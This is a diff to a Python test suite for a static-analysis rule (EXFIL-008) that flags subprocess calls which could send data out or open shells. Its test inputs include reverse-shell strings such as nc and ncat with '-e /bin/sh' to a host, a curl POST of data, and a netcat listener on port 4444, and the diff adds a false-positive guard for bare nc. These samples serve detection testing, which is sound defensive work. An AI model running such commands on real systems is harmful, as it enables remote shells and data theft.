@@ -27,7 +27,7 @@ class TestDetectSubprocessListExfil:
         [
             ("subprocess.run(['curl', '-d', data, url])", "curl"),
             ("subprocess.run(['wget', url])", "wget"),
-            ("subprocess.call(['nc', host, port])", "nc"),
+            ("subprocess.call(['nc', '-e', '/bin/sh', host])", "nc"),
             ("subprocess.check_output(['ncat', '-e', '/bin/sh', host])", "ncat"),
             ("subprocess.check_call(['netcat', host, port])", "netcat"),
             ("subprocess.Popen(['curl', '-s', '-X', 'POST', url])", "curl"),
@@ -95,6 +95,23 @@ class TestDetectSubprocessListExfil:
         node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
         findings = _detect_subprocess_list_exfil(node, _FILE, alias_map={})
         assert findings == []
+
+    def test_nc_without_network_flag_no_finding(self) -> None:
+        """Bare 'nc' without network flags should not trigger (false positive guard)."""
+        code = "subprocess.call(['nc', host, port])"
+        tree = ast.parse(code)
+        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
+        findings = _detect_subprocess_list_exfil(node, _FILE, alias_map={})
+        assert findings == []
+
+    def test_nc_with_network_flag_produces_finding(self) -> None:
+        """'nc' with -l flag triggers EXFIL-008."""
+        code = "subprocess.run(['nc', '-l', '-p', '4444'])"
+        tree = ast.parse(code)
+        node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
+        findings = _detect_subprocess_list_exfil(node, _FILE, alias_map={})
+        assert len(findings) == 1
+        assert findings[0].rule_id == "EXFIL-008"
 
     def test_no_finding_for_non_call_node(self) -> None:
         tree = ast.parse("x = 1")
